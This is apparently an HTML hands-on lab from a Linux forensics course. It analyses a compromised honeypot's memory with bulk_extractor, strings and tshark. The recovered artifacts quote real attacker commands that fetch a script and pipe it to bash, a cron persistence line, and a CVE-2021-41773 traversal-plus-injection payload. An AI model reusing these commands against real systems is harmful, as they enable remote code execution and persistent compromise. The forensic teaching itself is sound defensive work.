@@ -1,0 +1,566 @@
+<HTML>
+<HEAD>
+   <TITLE>Exercise 5 -- Linux Forensics</TITLE>
+   <link rel="stylesheet" type="text/css" href="../style/HalEx.css">
+</HEAD>
+<BODY>
+
+<p align="center">
+   <span class="page_title">Exercise 5: Bulk Extractor</span><br>
+   <span class="page_subtitle">Hands-On Exercise</span>
+</p>
+
+<h1>Goals For This Lab<p>
+
+<ol>
+<li>Run bulk extractor on the memory image of a compromised honeypot</li><p>
+<li>Recognize suspicious URLs</li><p>
+<li>Gather additional context from string data</li><p>
+<li>Explore network data in recovered PCAP</li><p>
+</ol><p>
+</h1>
+
+
+<h1>Before You Get Started</h1>
+
+<p>In this lab we will be working with the memory dump from Tyler Hudak's honeypot. This is the same
+   machine whose UAC data we were examining in previous labs.</p>
+
+<p>As a reminder, here is a description of how the honeypot came to be, directly from Tyler's 
+"<tt>readme.txt</tt>" file:</p>
+
+<blockquote>
+This Ubuntu Linux honeypot was put online in Azure in early October with the sole purpose of watching what happens with those exploiting CVE-2021-41773.<p>
+
+Initially there was a large amount of cryptominers that hit the system. You will see one cron script that is meant to remove files named kinsing in /tmp. This was my way of preventing these miners so more interesting things could occur.<p>
+
+Then, as with many things, I got busy and forgot about it. Fast forward to now (early December) and I remembered it was still up. I logged on and saw CPU usage through the roof. Instead of just shutting it down, I grabbed a disk snapshot, memory snapshot, and ran a tool named UAC (https://github.com/tclahr/uac) to grab live response. The results of this are in this directory.<p>
+
+There are three files:<p>
+
+- sdb.vhd.gz - VHD of the main drive obtained through an Azure disk snapshot<br>
+- ubuntu.20211208.mem.gz - Dump of memory using Lime<br>
+- uac.tgz - Results of UAC running on the system<p>
+
+Items were obtained in the order above - drive was snapshotted, memory was grabbed, then UAC was run.<p>
+
+Please feel free to share this. All I ask is that if you do any analysis to share it with the community.<p>
+
+If anyone would like to offer a more permanent home for the files, please let me know.<p>
+
+Thanks!<p>
+
+Tyler Hudak
+</blockquote>
+
+
+<h1>1. Running <tt>bulk_extractor</tt> and <tt>strings</tt></h1>
+
+<p>First we will need to uncompress the memory image and then run it through <tt>bulk_extractor</tt>
+  and <tt>strings</tt>:</p>
+
+<pre>
+[lab@LAB ~]$ <b>cd /images/All-Images/HudaksHoneypot/</b>
+[lab@LAB HudaksHoneypot]$ <b>ls</b>
+readme-hal  readme.txt  sdb.vhd.gz  uac.tgz  ubuntu.20211208.mem.gz
+[lab@LAB HudaksHoneypot]$ <b>gunzip ubuntu.20211208.mem.gz</b>
+[lab@LAB HudaksHoneypot]$ <b>mkdir -p /images/lab05</b>
+[lab@LAB HudaksHoneypot]$ <b>cd /images/lab05</b>
+[lab@LAB lab05]$ <b>bulk_extractor -o be-output /images/All-Images/HudaksHoneypot/ubuntu.20211208.mem</b>
+<i>[... much output ...]</i>
+Phase 2. Shutting down scanners
+Computing final histograms and shutting down...
+Phase 3. Generating stats and printing final usage information
+All Threads Finished!
+Elapsed time: 26.11 sec.
+Total MB processed: 1073
+Overall performance: 41.1 MBytes/sec 10.28 (MBytes/sec/thread)
+sbufs created:   6022738
+sbufs unaccounted: 0
+Time producer spent waiting for scanners to process data:         0:00:21 (21.97 seconds)
+Time consumer scanners spent waiting for data from producer:      0:00:00 (0.66 seconds)
+Average time each consumer spent waiting for data from producer:  0:00:00 (0.00 seconds)
+*** More time spent waiting for workers. You need a faster CPU or more cores for improved performance.
+Total email features found: 3667
+[lab@LAB lab05]$ <b>strings -a -t d /images/All-Images/HudaksHoneypot/ubuntu.20211208.mem | gzip >be-output/strings.asc.gz</b>
+[lab@LAB lab05]$ <b>cd be-output/</b>
+[lab@LAB be-output]$ <b>ls</b>
+aes_keys.txt                ether_histogram.txt  kml_carved.txt          strings.asc.gz            utmp_carved
+alerts.txt                  ether.txt            ntfsindx_carved.txt     tcp_histogram.txt         utmp_carved.txt
+ccn_histogram.txt           evtx_carved.txt      ntfslogfile_carved.txt  tcp.txt                   vcard.txt
+ccn_track2_histogram.txt    exif.txt             ntfsmft_carved.txt      telephone_histogram.txt   windirs.txt
+ccn_track2.txt              facebook.txt         ntfsusn_carved.txt      telephone.txt             winlnk.txt
+ccn.txt                     find_histogram.txt   packets.pcap            unrar_carved.txt          winpe_carved.txt
+domain_histogram.txt        find.txt             pii_teamviewer.txt      url_facebook-address.txt  winpe.txt
+domain.txt                  gps.txt              pii.txt                 url_facebook-id.txt       winprefetch.txt
+elf.txt                     httplogs.txt         rar.txt                 url_histogram.txt         zip.txt
+email_domain_histogram.txt  ip_histogram.txt     report.xml              url_microsoft-live.txt
+email_histogram.txt         ip.txt               rfc822.txt              url_searches.txt
+email.txt                   jpeg_carved.txt      sin.txt                 url_services.txt
+ether_histogram_1.txt       json.txt             sqlite_carved.txt       url.txt
+</pre>
+
+
+<h1>2. Suspicious URLs</h1>
+
+<p>Since the honeypot was susceptible to a web-based exploit, my first step would be to examine
+  "<tt>url_histogram.txt</tt>". However, this file is over 1500 lines long so we will need a
+  way to get some quick hits without having to read the entire file.</p>
+
+<p>Often I will start by looking at URLs with hard-coded IP addresses. Even this approach gives
+  a lot of output, so I will just show you some of the more interesting URLs I spotted in
+  the output below:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>grep '://[1-9]' url_histogram.txt</b>
+<i>[... snip ...]</i>
+n=62    http://185.191.32.198/ap.sh
+<i>[... snip ...]</i>
+n=10    http://81.71.160.63/cc.php
+<i>[... snip ...]</i>
+n=2     http://45.137.155.55/kinsing
+n=2     http://45.137.155.55/libsystem.so
+<i>[... snip ...]</i>
+n=1     http://185.191.32.198/unk.sh
+<i>[... snip ...]</i>
+n=1     http://88.218.227.141/wget.sh
+</pre>
+
+<p>Short URLs ending in "<tt>*.sh</tt>" are surely going to get my attention. "Kinsing" is a known
+  Linux malware family.</p>
+
+<p>These findings suggest some additional searches we could try in order to extract more information:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>grep '\.sh$' url_histogram.txt</b>
+n=62    http://185.191.32.198/ap.sh
+n=9     https://tmpfiles.org/dl/168017/wk.sh
+n=1     http://185.191.32.198/unk.sh
+n=1     http://88.218.227.141/wget.sh
+[lab@LAB be-output]$ <b>grep 185.191.32.198 url_histogram.txt</b>
+n=62    http://185.191.32.198/ap.sh
+n=1     http://185.191.32.198/unk.sh
+[lab@LAB be-output]$ <b>grep 45.137.155.55 url_histogram.txt</b>
+n=2     http://45.137.155.55/kinsing
+n=2     http://45.137.155.55/libsystem.so
+n=1     http://45.137.155.55/kin.P
+n=1     http://45.137.155.55/libsystlP
+</pre>
+
+<p>The URL "https://tmpfiles.org/dl/168017/wk.sh" is noteworthy. Otherwise our additional searches
+  did not turn up much new information.</p>
+
+
+<h1>3. Getting more detail</h1>
+
+<p>Now that we have some interesting URLs, we can use the ASCII strings we extracted to provide
+  some more context. I will start by looking for IP address 185.191.32.198. There is bad news
+  throughout the output, but in the interests of space I will just show the last few entries
+  which nicely summarize the most worrying items:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>zgrep -F 185.191.32.198 strings.asc.gz</b>
+<i>[... snip ...]</i>
+711018928 wget -q -O - http://185.191.32.198/ap.sh | bash > /dev/null 2>&1
+744325616 wget http://185.191.32.198/unk.sh
+749389057 http://185.191.32.198/ap.sh | bash > /dev/null 2>&1
+775327329 http://185.191.32.198/ap.sh | bash > /dev/null 2>&1
+776001460 p://185.191.32.198/ap.sh | bash > /dA
+783108736 string=* * * * * wget -q -O - http://185.191.32.198/ap.sh | bash > /dev/null 2>&1
+828702465 http://185.191.32.198/ap.sh | bash > /dev/null 2>&1
+869786411  -O - http://185.191.32.198/ap.sh |
+</pre>
+
+<p>So we have a "<tt>wget</tt>" command downloading "<tt>ap.sh</tt>" and piping it directly
+  into <tt>bash</tt>. This is a typical exploit trick that avoids the shell script ever
+  being written to disk. There is also a line that looks like a scheduled task that would
+  invoke the "<tt>wget</tt>" every minute. This is clearly not good.</p>
+
+<p>We can also gather some more details on IP address 45.137.155.55. Again I will cherry-pick
+  a few items from the output below:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>zgrep -F 45.137.155.55 strings.asc.gz</b>
+<i>[... snip ...]</i>
+122023365 A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash
+<i>[... snip ...]</i>
+608691856 62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"/ap.sh)|bash73[Wed Dec 08 15:00:55.984775 2021] [dumpio:trace7] [pid 2632:tid 139978772289280] mod_dumpio.c(103): [client 62.76.41.46:59048] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash
+608692336 [Wed Dec 08 15:00:55.984775 2021] [dumpio:trace7] [pid 2632:tid 139978772289280] mod_dumpio.c(103): [client 62.76.41.46:59048] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash
+611238416  /tmp/kinsing_XAfjBpvE http://45.137.155.55/kinsing
+635814928  /tmp/libsystem.so http://45.137.155.55/libsystem.so
+<i>[... snip ...]</i>
+</pre>
+
+<p>Apparently 45.137.155.55 is also hosting an "<tt>ap.sh</tt>" file. We have web logs from "<tt>mod_dumpio</tt>"
+  that show the curl/wget command as well. That means that the command came in as part of a POST request logged
+  by <tt>mod_dumpio</tt>. Also there seems to be a relationship between Kinsing files in <tt>/tmp</tt> and
+  URLs from 45.137.155.55.</p>
+
+<p>In the middle of the output above there is what appears to be a web log showing a directory traversal
+  attack from 62.76.41.46 (the honeypot was set up to study the CVE-2021-41773 directory traversal
+  vulnerability). This finding is a bit of luck actually. A <tt>mod_dumpio</tt> message about IP 45.137.155.55
+  just happened to get smashed together in memory with the log entry for IP 62.76.41.46.</p>
+
+
+<h1>4. You say you want web logs?</h1>
+
+<p>One of the types of data bulk extractor finds is items that look like web log entries.
+  You will find this data in "<tt>httplogs.txt</tt>":</p>
+
+<pre>
+[lab@LAB be-output]$ <b>grep -F 62.76.41.46 httplogs.txt</b>
+199746416       62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"      62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+552751980       e Ge62.76.41.46 - - [08/Dec/2021:15:00:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"  e Ge62.76.41.46 - - [08/Dec/2021:15:00:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+608691616       62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"      62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+608691856       62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"/ap.sh)|bash73[Wed Dec 08 15:00:55.984775 2021] [dumpio:trace7] [pid 2632:tid 139978772289280] mod_dumpio.c(103): [client 62.76.41.46:59048] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash  62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"/ap.sh)|bash73[Wed Dec 08 15:00:55.984775 2021] [dumpio:trace7] [pid 2632:tid 139978772289280] mod_dumpio.c(103): [client 62.76.41.46:59048] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash
+608692576       62.76.41.46 - - [08/Dec/2021:15:00:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"      62.76.41.46 - - [08/Dec/2021:15:00:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+660238816       62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"      62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+660239056       62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"/ap.sh)|bash73[Wed Dec 08 15:00:55.984775 2021] [dumpio:trace7] [pid 2632:tid 139978772289280] mod_dumpio.c(103): [client 62.76.41.46:59048] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash  62.76.41.46 - - [08/Dec/2021:15:58:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"/ap.sh)|bash73[Wed Dec 08 15:00:55.984775 2021] [dumpio:trace7] [pid 2632:tid 139978772289280] mod_dumpio.c(103): [client 62.76.41.46:59048] mod_dumpio:  dumpio_in (data-HEAP): A=|echo;(curl -s 45.137.155.55/ap.sh||wget -q -O- 45.137.155.55/ap.sh)|bash
+660239776       62.76.41.46 - - [08/Dec/2021:15:00:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"      62.76.41.46 - - [08/Dec/2021:15:00:55 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 200 273 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+</pre>
+
+<p>Although this appears to be a lot of output, if you look closely there are really only two unique
+  requests here: one at 15:00:55 and one at 15:58:17.</p>
+  
+
+<h1>5. PCAP investigation</h1>
+
+<p>In class I suggested a <tt>tshark</tt> command line for quickly summarizing the extracted PCAP
+  data. In this case, however, the results are quite messy:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>tshark -n -r packets.pcap -Tfields -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport | sort | uniq -c</b>
+      1 10.0.0.4        22      64.233.202.242  29953
+      1 10.0.0.4        33824   10.76.230.1     2222
+      1 10.0.0.4        33826   168.63.129.16   32526
+      1 10.0.0.4        34264   10.76.231.1     2222
+      1 10.0.0.4        34740   10.76.236.1     2222
+      1 10.0.0.4        36244   10.76.232.1     2222
+      4 10.0.0.4        36444   52.147.219.192  80
+      1 10.0.0.4        36496   18.198.162.56   443
+      2 10.0.0.4        36872   168.63.129.16   80
+      1 10.0.0.4        37134   10.53.112.1     2222
+      1 10.0.0.4        39572   10.53.114.1     2222
+      1 10.0.0.4        40108   168.63.129.16   32526
+      1 10.0.0.4        40930   10.76.229.1     2222
+      3 10.0.0.4        41454   91.189.91.39    80
+      3 10.0.0.4        41846   52.147.219.192  80
+      1 10.0.0.4        46296   3.66.81.63      443
+      1 10.0.0.4        46676   10.76.241.1     2222
+      1 10.0.0.4        47810   52.147.219.192  80
+      2 10.0.0.4        49646   45.137.155.55   80
+      1 10.0.0.4        50346   10.76.239.1     2222
+      1 10.0.0.4        50786   10.53.116.1     2222
+      1 10.0.0.4        50856   10.53.113.1     2222
+      1 10.0.0.4        51940   10.76.233.1     2222
+      1 10.0.0.4        52504   10.53.119.1     2222
+      1 10.0.0.4        52970   10.76.234.1     2222
+      1 10.0.0.4        53144   10.53.118.1     2222
+     37 10.0.0.4        54572   45.137.155.55   80
+      1 10.0.0.4        54650   10.76.237.1     2222
+      1 10.0.0.4        55672   10.53.117.1     2222
+      1 10.0.0.4        56372   10.53.115.1     2222
+      1 10.0.0.4        56574   10.76.240.1     2222
+      1 10.0.0.4        57492   10.53.120.1     2222
+      1 10.0.0.4        58570   10.76.242.1     2222
+      1 10.0.0.4        59198   168.63.129.16   80
+      1 10.0.0.4        59726   10.76.235.1     2222
+      1 10.0.0.4        60118   168.63.129.16   80
+      2 10.0.0.4        60188   168.63.129.16   80
+      1 10.0.0.4        60244   10.76.238.1     2222
+      1 168.63.129.16   32526   10.0.0.4        33944
+      3 168.63.129.16   80      10.0.0.4        38350
+      2 168.63.129.16   80      10.0.0.4        38382
+      1 168.63.129.16   80      10.0.0.4        38390
+      1 168.63.129.16   80      10.0.0.4        38396
+      2 168.63.129.16   80      10.0.0.4        38402
+      2 168.63.129.16   80      10.0.0.4        38420
+      3 168.63.129.16   80      10.0.0.4        59124
+      1 168.63.129.16   80      10.0.0.4        59146
+      1 168.63.129.16   80      10.0.0.4        60092
+      2 168.63.129.16   80      10.0.0.4        60102
+      1 168.63.129.16   80      10.0.0.4        60118
+      2 169.254.169.254 80      10.0.0.4        33576
+      1 169.254.169.254 80      10.0.0.4        54298
+      1 169.254.169.254 80      10.0.0.4        55276
+     26 172.67.178.57   80      10.0.0.4        56008
+      2 18.198.162.56   443     10.0.0.4        36496
+    193 185.104.45.29   80      10.0.0.4        46464
+     60 185.104.45.29   80      10.0.0.4        46472
+     90 185.199.111.133 443     10.0.0.4        57210
+      2 3.123.183.86    443     10.0.0.4        45552
+      2 3.123.183.86    443     10.0.0.4        45554
+      5 3.123.183.86    443     10.0.0.4        46522
+      1 3.66.81.63      443     10.0.0.4        45506
+      3 3.66.81.63      443     10.0.0.4        46472
+      1 3.66.81.63      443     10.0.0.4        46502
+      3 3.66.81.63      443     10.0.0.4        46550
+      2 40.79.154.83    443     10.0.0.4        40832
+      1 40.79.154.83    443     10.0.0.4        40836
+      2 40.79.154.83    443     10.0.0.4        41816
+      5 40.79.154.87    443     10.0.0.4        34274
+      6 40.79.154.87    443     10.0.0.4        34304
+     38 45.137.155.55   80      10.0.0.4        35788
+     17 45.137.155.55   80      10.0.0.4        42636
+     91 45.137.155.55   80      10.0.0.4        43864
+   1792 45.137.155.55   80      10.0.0.4        44734
+    410 45.137.155.55   80      10.0.0.4        46902
+   1138 45.137.155.55   80      10.0.0.4        49646
+     69 45.137.155.55   80      10.0.0.4        51612
+     24 45.137.155.55   80      10.0.0.4        56488
+     40 45.137.155.55   80      10.0.0.4        57366
+     25 45.137.155.55   80      10.0.0.4        57466
+    109 52.147.219.192  80      10.0.0.4        36444
+      2 64.233.202.242  29953   10.0.0.4        22
+     32 91.189.91.38    80      10.0.0.4        37850
+</pre>
+
+<p>There is good information here, but all of the ephemeral port numbers are making
+  things hard to read. Also, it would be nice to match up the inbound and outbound
+  packet flow data.</p>
+
+<p>Back to the old command line dojo to work on some new kung fu:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>tshark -n -r packets.pcap -Tfields -e ip.src -e tcp.srcport -e ip.dst -e tcp.dstport |
+                       awk '$4 > 9999 {$4 = $2; $2 = $3; $3 = $1; $1 = $2}; {print $1"\t"$3"\t"$4}' | sort | uniq -c</b>
+      1 10.0.0.4        10.53.112.1     2222
+      1 10.0.0.4        10.53.113.1     2222
+      1 10.0.0.4        10.53.114.1     2222
+      1 10.0.0.4        10.53.115.1     2222
+      1 10.0.0.4        10.53.116.1     2222
+      1 10.0.0.4        10.53.117.1     2222
+      1 10.0.0.4        10.53.118.1     2222
+      1 10.0.0.4        10.53.119.1     2222
+      1 10.0.0.4        10.53.120.1     2222
+      1 10.0.0.4        10.76.229.1     2222
+      1 10.0.0.4        10.76.230.1     2222
+      1 10.0.0.4        10.76.231.1     2222
+      1 10.0.0.4        10.76.232.1     2222
+      1 10.0.0.4        10.76.233.1     2222
+      1 10.0.0.4        10.76.234.1     2222
+      1 10.0.0.4        10.76.235.1     2222
+      1 10.0.0.4        10.76.236.1     2222
+      1 10.0.0.4        10.76.237.1     2222
+      1 10.0.0.4        10.76.238.1     2222
+      1 10.0.0.4        10.76.239.1     2222
+      1 10.0.0.4        10.76.240.1     2222
+      1 10.0.0.4        10.76.241.1     2222
+      1 10.0.0.4        10.76.242.1     2222
+      1 10.0.0.4        168.63.129.16   32526
+     25 10.0.0.4        168.63.129.16   80
+      4 10.0.0.4        169.254.169.254 80
+     26 10.0.0.4        172.67.178.57   80
+      3 10.0.0.4        18.198.162.56   443
+    253 10.0.0.4        185.104.45.29   80
+     90 10.0.0.4        185.199.111.133 443
+      9 10.0.0.4        3.123.183.86    443
+      9 10.0.0.4        3.66.81.63      443
+      5 10.0.0.4        40.79.154.83    443
+     11 10.0.0.4        40.79.154.87    443
+   3683 10.0.0.4        45.137.155.55   80
+    117 10.0.0.4        52.147.219.192  80
+     32 10.0.0.4        91.189.91.38    80
+      3 10.0.0.4        91.189.91.39    80
+      1 168.63.129.16   10.0.0.4        33826
+      1 168.63.129.16   10.0.0.4        40108
+      3 64.233.202.242  10.0.0.4        22
+</pre>
+
+<p>Bonus points if you can figure out how the nasty "<tt>awk</tt>" expression works!</p>
+
+<p>The port 2222/tcp activity could be scanning behavior. There is port 80 traffic with 45.137.155.55
+  but none with 185.191.32.198, at least in this PCAP. And of course we now have a whole bunch of
+  new IP addresses to potentially investigate.</p>
+
+<p>Remember that just because an IP address appears in our packet capture does not necessarily
+  mean it will be found as a string in memory. The IP address is more likely the result of a DNS
+  lookup than being a hard-coded IP address:</p>
+
+<pre>
+[lab@LAB be-output]$ <b>zgrep -F 185.104.45.29 strings.asc.gz</b>
+[lab@LAB be-output]$ <b>host 185.104.45.29</b>
+29.45.104.185.in-addr.arpa domain name pointer web108.ukraine.com.ua.
+[lab@LAB be-output]$ <b>zgrep -F ukraine.com.ua strings.asc.gz</b>
+[lab@LAB be-output]$
+</pre>
+
+<p>Perhaps this IP address is known by multiple other names, different from its reverse lookup.</p>
+
+
+
+<h1>6. Going with the flow</h1>
+
+<p>What data can we gather by reconstructing the TCP streams in our PCAP file?</p>
+
+<pre>
+[lab@LAB be-output]$ <b>tcpflow -r packets.pcap -o flows -e http</b>
+[lab@LAB be-output]$ <b>ls flows</b>
+003.066.081.063.00443-010.000.000.004.45506               168.063.129.016.00080-010.000.000.004.38390
+003.066.081.063.00443-010.000.000.004.46472               168.063.129.016.00080-010.000.000.004.38390-HTTPBODY-001
+003.066.081.063.00443-010.000.000.004.46550               168.063.129.016.00080-010.000.000.004.38396
+003.123.183.086.00443-010.000.000.004.45552               168.063.129.016.00080-010.000.000.004.38396-HTTPBODY-001
+003.123.183.086.00443-010.000.000.004.45554               168.063.129.016.00080-010.000.000.004.38402
+003.123.183.086.00443-010.000.000.004.46522               168.063.129.016.00080-010.000.000.004.38402c1
+010.000.000.004.00022-064.233.202.242.29953               168.063.129.016.00080-010.000.000.004.38402c1-HTTPBODY-001
+010.000.000.004.36872-168.063.129.016.00080               168.063.129.016.00080-010.000.000.004.38420
+010.000.000.004.40108-168.063.129.016.32526               168.063.129.016.00080-010.000.000.004.38420-HTTPBODY-001
+010.000.000.004.46296-003.066.081.063.00443               168.063.129.016.00080-010.000.000.004.59124
+010.000.000.004.59198-168.063.129.016.00080               168.063.129.016.00080-010.000.000.004.59124-HTTPBODY-001
+010.000.000.004.60188-168.063.129.016.00080               168.063.129.016.00080-010.000.000.004.59124c1
+018.198.162.056.00443-010.000.000.004.36496               168.063.129.016.00080-010.000.000.004.59124c2
+040.079.154.083.00443-010.000.000.004.40832               168.063.129.016.00080-010.000.000.004.59124c2-HTTPBODY-001
+040.079.154.083.00443-010.000.000.004.40836               168.063.129.016.00080-010.000.000.004.59146
+040.079.154.083.00443-010.000.000.004.41816               168.063.129.016.00080-010.000.000.004.59146-HTTPBODY-001
+040.079.154.087.00443-010.000.000.004.34274               168.063.129.016.00080-010.000.000.004.60092
+040.079.154.087.00443-010.000.000.004.34304               168.063.129.016.00080-010.000.000.004.60092-HTTPBODY-001
+045.137.155.055.00080-010.000.000.004.35788               168.063.129.016.00080-010.000.000.004.60102
+045.137.155.055.00080-010.000.000.004.42636               168.063.129.016.00080-010.000.000.004.60102c1
+045.137.155.055.00080-010.000.000.004.43864               168.063.129.016.00080-010.000.000.004.60102c1-HTTPBODY-001
+045.137.155.055.00080-010.000.000.004.44734               168.063.129.016.00080-010.000.000.004.60118
+045.137.155.055.00080-010.000.000.004.46902               168.063.129.016.00080-010.000.000.004.60118-HTTPBODY-001
+045.137.155.055.00080-010.000.000.004.49646               169.254.169.254.00080-010.000.000.004.33576
+045.137.155.055.00080-010.000.000.004.51612               169.254.169.254.00080-010.000.000.004.33576-HTTPBODY-001.json
+045.137.155.055.00080-010.000.000.004.56488               169.254.169.254.00080-010.000.000.004.54298
+045.137.155.055.00080-010.000.000.004.57366               169.254.169.254.00080-010.000.000.004.54298-HTTPBODY-001.json
+045.137.155.055.00080-010.000.000.004.57466               169.254.169.254.00080-010.000.000.004.55276
+052.147.219.192.00080-010.000.000.004.36444               169.254.169.254.00080-010.000.000.004.55276-HTTPBODY-001.json
+052.147.219.192.00080-010.000.000.004.36444-HTTPBODY-001  172.067.178.057.00080-010.000.000.004.56008
+052.147.219.192.00080-010.000.000.004.36444-HTTPBODY-002  185.104.045.029.00080-010.000.000.004.46464
+091.189.091.038.00080-010.000.000.004.37850               185.104.045.029.00080-010.000.000.004.46472
+168.063.129.016.00080-010.000.000.004.38350               185.199.111.133.00443-010.000.000.004.57210
+168.063.129.016.00080-010.000.000.004.38382               report.xml
+[lab@LAB be-output]$ <b>file flows/*</b>
+flows/003.066.081.063.00443-010.000.000.004.45506:                   data
+flows/003.066.081.063.00443-010.000.000.004.46472:                   data
+flows/003.066.081.063.00443-010.000.000.004.46550:                   data
+flows/003.123.183.086.00443-010.000.000.004.45552:                   data
+flows/003.123.183.086.00443-010.000.000.004.45554:                   data
+flows/003.123.183.086.00443-010.000.000.004.46522:                   data
+flows/010.000.000.004.00022-064.233.202.242.29953:                   data
+flows/010.000.000.004.36872-168.063.129.016.00080:                   data
+flows/010.000.000.004.40108-168.063.129.016.32526:                   data
+flows/010.000.000.004.46296-003.066.081.063.00443:                   data
+flows/010.000.000.004.59198-168.063.129.016.00080:                   ASCII text, with CRLF line terminators
+flows/010.000.000.004.60188-168.063.129.016.00080:                   ASCII text, with CRLF line terminators
+flows/018.198.162.056.00443-010.000.000.004.36496:                   data
+flows/040.079.154.083.00443-010.000.000.004.40832:                   data
+flows/040.079.154.083.00443-010.000.000.004.40836:                   data
+flows/040.079.154.083.00443-010.000.000.004.41816:                   data
+flows/040.079.154.087.00443-010.000.000.004.34274:                   data
+flows/040.079.154.087.00443-010.000.000.004.34304:                   data
+flows/045.137.155.055.00080-010.000.000.004.35788:                   data
+flows/045.137.155.055.00080-010.000.000.004.42636:                   data
+flows/045.137.155.055.00080-010.000.000.004.43864:                   data
+flows/045.137.155.055.00080-010.000.000.004.44734:                   data
+flows/045.137.155.055.00080-010.000.000.004.46902:                   data
